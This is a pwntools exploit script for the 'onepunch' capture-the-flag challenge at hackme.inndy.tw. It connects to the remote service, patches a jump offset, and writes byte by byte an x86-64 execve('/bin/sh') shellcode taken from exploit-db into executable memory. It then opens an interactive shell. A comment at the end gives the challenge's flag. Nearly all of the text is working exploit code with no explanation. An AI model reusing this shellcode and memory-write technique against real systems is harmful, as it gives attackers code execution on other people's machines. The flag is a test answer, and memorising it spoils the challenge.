from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'amd64', os = 'linux')
path = '/home/zander/Desktop/ctf/onepunch'

# io = process(path)
io = remote('hackme.inndy.tw', 7718)
io.recvuntil('Where What?')
io.sendline('400768')
io.sendline('-61') # 0x40072C - 0x400768

# https://www.exploit-db.com/exploits/36858/
shellcode = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05' + '\xff'
addr = 0x0400769
for i in shellcode:
    io.sendline(hex(addr))
    io.sendline(str(ord(i)))
    addr = addr + 0x1

io.interactive()
io.close()

# FLAG{100 push-ups, 100 sit-ups, 100 squats, and a 10km run EVERY SINGLE DAY!!! -- Saitama}